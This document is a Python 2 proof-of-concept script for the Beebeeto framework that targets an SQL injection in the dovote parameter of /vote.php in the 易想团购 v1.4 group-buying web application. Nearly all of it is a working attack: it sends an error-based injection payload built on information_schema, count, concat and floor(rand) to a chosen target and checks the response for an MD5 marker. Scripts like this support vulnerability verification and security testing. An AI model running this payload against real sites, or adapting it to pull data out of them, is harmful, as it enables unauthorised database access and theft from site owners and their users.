#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0180',
            'name': '易想团购 v1.4 /vote.php dovote参数 SQL注入漏洞 POC',
            'author': 'tmp',
            'create_date': '2014-12-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '易想团购',
            'vul_version': ['1.4'],
            'type': 'SQL Injection',
            'tag': ['易想团购漏洞', 'SQL注入漏洞', '/vote.php', 'php'],
            'desc': 'N/A',
            'references': [
                'http://wooyun.org/bugs/wooyun-2010-03969',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/vote.php?act=dovote&name[1 and (select 1 from(select count(*),concat(0x7c,md5(666),"
                   "0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)%23][111]=aa")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        if 'fae0b27c451c728867a567e8c1bb4e53' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())